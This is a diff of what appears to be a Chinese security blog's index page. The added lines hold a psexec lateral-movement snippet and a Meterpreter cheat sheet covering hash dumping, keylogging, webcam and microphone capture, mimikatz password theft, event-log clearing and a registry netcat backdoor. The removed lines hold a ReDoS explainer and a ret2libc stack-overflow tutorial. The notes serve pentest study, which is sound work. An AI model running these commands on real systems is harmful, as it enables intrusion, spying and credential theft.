+<h3 id="命令执行-5"><a href="#命令执行-5" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#打开交互式shell</span><br><span class="line">psexec \\170.170.64.19 -u admin -p passwd cmd</span><br><span class="line">#执行单条命令</span><br><span class="line">psexec \\170.170.64.19 -u admin -p passwd -s cmd /c &quot;calc.exe&quot;</span><br><span class="line">#拷贝文件到远程计算机并执行</span><br><span class="line">psexec \\170.170.64.19 -u admin -p passwd -c C:\Users\Administrator\Desktop\GetHashes.exe</span><br><span class="line"></span><br><span class="line">#其他参数</span><br><span class="line">–accepteula 第一次运行会弹框,输入这个参数便不会弹框</span><br><span class="line">-s 以 “nt authority\system” 权限运行远程进程</span><br><span class="line">-h 如果可以，以管理员权限运行远程进程</span><br><span class="line">-d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项</span><br><span class="line">\\ip 可以替换成 @ip.txt (存放多个 ip 的文本)，可以批量执行命令</span><br></pre></td></tr></table></figure>
+<h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><h3 id="前提-8"><a href="#前提-8" class="headerlink" title="前提"></a>前提</h3><p>开启远程桌面，3389端口</p>
+<h3 id="命令执行-6"><a href="#命令执行-6" class="headerlink" title="命令执行"></a>命令执行</h3><p>可直接通过mstsc进入目标系统。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/04/meterpreter命令总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/08/04/meterpreter命令总结/" itemprop="url">
+                  meterpreter命令总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-04T22:19:25+08:00">
+                2020-08-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/08/04/meterpreter命令总结/" class="leancloud_visitors" data-flag-title="meterpreter命令总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。Meterpreter功能强大，支持信息收集、提权、注册表操作、哈希利用、截屏录屏等操作，也支持对摄像头、录音设备、键盘鼠标的控制。</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 进入会话   </span><br><span class="line">sessions -k 杀死会话</span><br><span class="line">pwd         查看当前目录</span><br><span class="line">getuid      查看当前用户信息</span><br><span class="line">sysinfo     查看远程主机系统信息</span><br><span class="line">execute     在目标主机上执行命令</span><br><span class="line">hashdump    获取目标主机用户密码hash信息</span><br><span class="line">getsystem   提升权限</span><br><span class="line">shell       切换至传统shell</span><br><span class="line">background  将当前session放入后台</span><br><span class="line">kill        关闭进程</span><br><span class="line">load        加载meterpreter扩展</span><br><span class="line">exit        退出当前shell</span><br><span class="line">arp         显示ARP缓存</span><br><span class="line">getproxy    显示当前代理配置</span><br><span class="line">ifconfig    显示接口</span><br><span class="line">ipconfig    显示接口</span><br><span class="line">netstat     显示网络连接</span><br><span class="line">portfwd     将本地端口转发到远程服务</span><br><span class="line">route       查看和修改路由</span><br><span class="line">getenv      查看环境变量</span><br><span class="line">getprivs    查看权限</span><br><span class="line">pgrep       搜索进程</span><br><span class="line">ps          查看当前运行进程</span><br><span class="line">reboot      重启系统</span><br><span class="line">reg         修改注册表</span><br><span class="line">clearev     清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/meterpreter01.png" alt=""></p>
+<h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cat           查看文件</span><br><span class="line">cd            改变目录</span><br><span class="line">checksum      校验文件md5或sha1</span><br><span class="line">cp            拷贝文件</span><br><span class="line">download      下载文件</span><br><span class="line">edit          编辑文件</span><br><span class="line">ls            列出文件</span><br><span class="line">mkdir         创建文件夹</span><br><span class="line">mv            移动文件</span><br><span class="line">rm            删除文件</span><br><span class="line">rmdir         删除文件夹</span><br><span class="line">search        查找文件</span><br><span class="line">show_mount    列出所有驱动器</span><br><span class="line">upload        上传文件</span><br></pre></td></tr></table></figure>
+<h2 id="用户设备命令"><a href="#用户设备命令" class="headerlink" title="用户设备命令"></a>用户设备命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops   列出所有可访问的桌面和窗口</span><br><span class="line">getdesktop     获取当前桌面</span><br><span class="line">idletime       获取远程系统已运行时间（从上次重新启动开始计算）</span><br><span class="line">keyboard_send  发送击键</span><br><span class="line">keyscan_dump   转储击键缓冲区</span><br><span class="line">keyscan_start  开始捕获击键</span><br><span class="line">keyscan_stop   停止捕获击键</span><br><span class="line">mouse          发送鼠标事件</span><br><span class="line">screenshare    实时观看远程用户的桌面</span><br><span class="line">screenshot     截屏</span><br><span class="line">setdesktop     更改shell当前桌面</span><br><span class="line">uictl          控制用户界面组件</span><br><span class="line">record_mic     记录麦克风一定秒数</span><br><span class="line">webcam_chat    开始视频聊天</span><br><span class="line">webcam_list    列出网络摄像头</span><br><span class="line">webcam_snap    从指定网络摄像头拍摄</span><br><span class="line">webcam_stream  播放指定网络摄像头的视频流</span><br><span class="line">play           在目标系统播放音频</span><br></pre></td></tr></table></figure>
+<h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz   加载mimikatz模块   </span><br><span class="line">help mimikatz   查看帮助</span><br><span class="line">wdigest         获取密码</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/meterpreter02.png" alt=""></p>
+<h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run vnc 使用vnc连接远程桌面</span><br><span class="line">run getgui -e 开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp 开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=test PASSWORD=123456 添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662   将3389端口转发到6662</span><br></pre></td></tr></table></figure>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>
+<h2 id="针对未安装补丁攻击"><a href="#针对未安装补丁攻击" class="headerlink" title="针对未安装补丁攻击"></a>针对未安装补丁攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  收集补丁信息</span><br><span class="line">攻击：</span><br><span class="line">msf &gt; use exploit/windows/local/xxxx</span><br><span class="line">msf &gt; set SESSION 2</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>
+<h2 id="注册表设置nc后门"><a href="#注册表设置nc后门" class="headerlink" title="注册表设置nc后门"></a>注册表设置nc后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><p>meterpreter help文件</p>
+</li>
+<li><p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/28/哈希密码爆破工具hashcat/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1593,674 +2249,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/12/正则表达式导致的redos问题/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/05/12/正则表达式导致的redos问题/" itemprop="url">
-                  正则表达式导致的redos问题
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-12T21:48:42+08:00">
-                2020-05-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/05/12/正则表达式导致的redos问题/" class="leancloud_visitors" data-flag-title="正则表达式导致的redos问题">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正则表达式是非常受欢迎的字符串处理工具，在各种场景都有着广泛的用途，而不规范的使用也会引发一些安全问题，比如针对运算资源的攻击：redos，它就是一种错误使用正则表达式导致运算量随待匹配字符指数级增长的安全问题。</p>
-<h2 id="贪婪和非贪婪匹配"><a href="#贪婪和非贪婪匹配" class="headerlink" title="贪婪和非贪婪匹配"></a>贪婪和非贪婪匹配</h2><p>正则表达式有很多重复运算符，而使用这些重复运算符匹配时往往会有不同答案都符合条件，正则表达式在默认情况下会选择贪婪匹配的方式。</p>
-<table>
-<thead>
-<tr>
-<th>符号</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>*</td>
-<td>匹配前面的子表达式零次或多次</td>
-</tr>
-<tr>
-<td>+</td>
-<td>匹配前面的子表达式一次或多次</td>
-</tr>
-<tr>
-<td>.</td>
-<td>匹配除换行符 \n 之外的任何单字符</td>
-</tr>
-<tr>
-<td>?</td>
-<td>匹配前面的子表达式零次或一次</td>
-</tr>
-</tbody>
-</table>
-<p>例如有正则a.*b，有待匹配字段accbccb，看似accb和accbccb两种结果都符合正则，但是由于正则表达式默认选择贪婪匹配模式，会尽可能多的匹配结果，就会匹配出accbccb的结果。</p>
-<p>如果我们要得到accb的结果，就需要使用?运算符进行非贪婪匹配，构造正则表达式a.*?b</p>
-<h2 id="正则表达式引擎"><a href="#正则表达式引擎" class="headerlink" title="正则表达式引擎"></a>正则表达式引擎</h2><p>正则表达式引擎有两种方式实现：DFA 自动机（Deterministic Final Automata 确定型有穷自动机）和 NFA 自动机（Non deterministic Finite Automaton 不确定型有穷自动机）。</p>
-<p>其中DFA 自动机的时间复杂度是线性的，更加稳定，但是功能有限。而 NFA 的时间复杂度比较不稳定，复杂度取决于正则表达式的书写。但由于NFA自动机的功能强大，被多种编程语言广泛使用，如python、java、perl、php、ruby等编程语言的正则表达式，都使用了NFA方式去实现。</p>
-<h2 id="正则表达式回溯"><a href="#正则表达式回溯" class="headerlink" title="正则表达式回溯"></a>正则表达式回溯</h2><p>NFA的正则表达式引擎在匹配时为了满足尽可能多的功能，复杂度也会更高，也就是需要走的步数会很多。</p>
-<p>比如我们使用a*b对aaaaaa做一次正则匹配，我们的大脑可以一眼看出字符串中没有b，无匹配结果，但是正则表达式不会这样处理，他会一步一步的来尝试。</p>
-<p>首先他会一步步匹配到aaaaaa，然后发现最后一位不是b，不匹配，回溯。<br>接着去匹配aaaaa，最后一位不匹配，回溯<br>接着去匹配aaaa，最后一位不匹配，回溯<br>接着去匹配aaa，最后一位不匹配，回溯<br>接着去匹配aa，最后一位不匹配，回溯<br>接着去匹配a，最后一位不匹配，回溯<br>发现无匹配结果  </p>
-<p>然后又会从第二位a开始，重新经历上述过程进行匹配，再从第三位，第四位开始，直到最后一位。</p>
-<p>最后才会抛出无匹配结果的答案，过程十分繁琐，</p>
-<h2 id="引发dos问题的情况"><a href="#引发dos问题的情况" class="headerlink" title="引发dos问题的情况"></a>引发dos问题的情况</h2><p>上述的匹配过程虽然繁琐，但是对于计算机的计算量来说仍然是毛毛雨。如果我们想让计算机的计算量也无能为力的话，就需要将重复运算符嵌套起来，让计算量呈指数增长。</p>
-<p>比如使用^(a+)+$，然后进行一次错误匹配，在<a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a> 上面观察所需的步数。</p>
-<p>ab 6步<br>aab 12步<br>aaab 24步<br>aaaab 48步<br>……<br>aaaaaaaaaab 3072步<br>……<br>aaaaaaaaaaaaaaab 98304步  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/redos/redos01.png" alt=""></p>
-<p>……  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/redos/redos01.png" alt=""></p>
-<p>aaaaaaaaaaaaaaaaab 393216步  </p>
-<p>再继续增长该网站就已经抛出catastrophic backtracking的错误了</p>
-<p>也可以在本地编程观察正则运行所需的时间：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def run_re(test_str):</span><br><span class="line">	start_time = time.time()</span><br><span class="line">	regex = re.compile(&quot;^(a+)+$&quot;)</span><br><span class="line">	regex.match(test_str)</span><br><span class="line">	stop_time = time.time()</span><br><span class="line">	return stop_time - start_time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	str_list=(</span><br><span class="line">	&apos;aaaaaaaaaaaaB&apos;,</span><br><span class="line">	&apos;aaaaaaaaaaaaaaaaaB&apos;,</span><br><span class="line">	&apos;aaaaaaaaaaaaaaaaaaaaB&apos;,</span><br><span class="line">	&apos;aaaaaaaaaaaaaaaaaaaaaaaaaB&apos;,</span><br><span class="line">	&apos;aaaaaaaaaaaaaaaaaaaaaaaaaaaaB&apos;,</span><br><span class="line">	&apos;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB&apos;</span><br><span class="line">	)</span><br><span class="line">	for test_str in str_list:</span><br><span class="line">		match_time = run_re(test_str)</span><br><span class="line">		print(&quot;str: &quot;+test_str)</span><br><span class="line">		print(&quot;time: &#123;0&#125;&quot;.format(match_time))</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
-<p>可以看到，随着待匹配字符串的长度越来越长，所需的时间呈指数增长，计算机也在运行过程随着cpu的高占用嗡嗡作响。</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/redos/redos03.png" alt=""></p>
-<p>再让长度这么增长下去，可能需要几天，几个月的运算，在实战渗透测试场景甚至可以多发几个请求占用多个处理器，占用大量的cpu资源，形成dos问题，影响正常业务。</p>
-<h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ul>
-<li>规范正则表达式的书写，尽量避免重复运算符嵌套等情况的出现。</li>
-<li>限制用户输入的长度。</li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/27/栈溢出之ret2libc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2020/02/27/栈溢出之ret2libc/" itemprop="url">
-                  栈溢出之ret2libc
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-27T20:44:04+08:00">
-                2020-02-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/二进制/" itemprop="url" rel="index">
-                    <span itemprop="name">二进制</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2020/02/27/栈溢出之ret2libc/" class="leancloud_visitors" data-flag-title="栈溢出之ret2libc">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇接着前几篇的进度介绍另一种基本ROP方法：ret2libc</p>
-<h2 id="ret2libc原理"><a href="#ret2libc原理" class="headerlink" title="ret2libc原理"></a>ret2libc原理</h2><p>libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。</p>
-<p>一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库，虽然程序本身并没有用到system等危险函数，但是动态链接库中存在大量的可利用函数，就产生了新的攻击方式，从这些动态链接库中找可利用片段，拼接成恶意代码并控制rip跳转执行。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#undef _FORTIFY_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">	char buf[128];</span><br><span class="line">	read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">	vulnerable_function();</span><br><span class="line">	write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>关闭掉地址随机化和栈保护进行编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ret2libc.c -g -fno-stack-protector -no-pie -o ret2libc64</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
-<h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>使用gdb的checksec查看安全机制</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc01.png" alt=""></p>
-<p>分析程序，read buf局部变量时存在栈溢出问题，但是从题目中直接无法找到任何可利用的代码片段，也有NX保护无法直接执行shellcode，根据前面介绍的ret2libc原理，我们应该在程序的动态链接库里面寻找信息。</p>
-<p>设想，只要在动态链接库中找到system函数，再找到/bin/sh字符串，然后覆盖返回地址跳转到动态链接库的system函数控制执行/bin/sh指令就可以得到shell。</p>
-<h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息，此次需要使用objdump来在动态链接库中寻找信息。</p>
-<p>1.ldd查看动态链接库</p>
-<p>ldd ret2libc64</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc02.png" alt=""></p>
-<p>可以看到使用了libc.so.6，libc库中存在大量的可利用函数，所以我们需要在它里面寻找。</p>
-<p>2.在动态链接库中寻找system地址</p>
-<p>objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc03.png" alt=""></p>
-<p>3.在动态链接库中寻找”/bin/sh”地址</p>
-<p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ebx</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc04.png" alt=""></p>
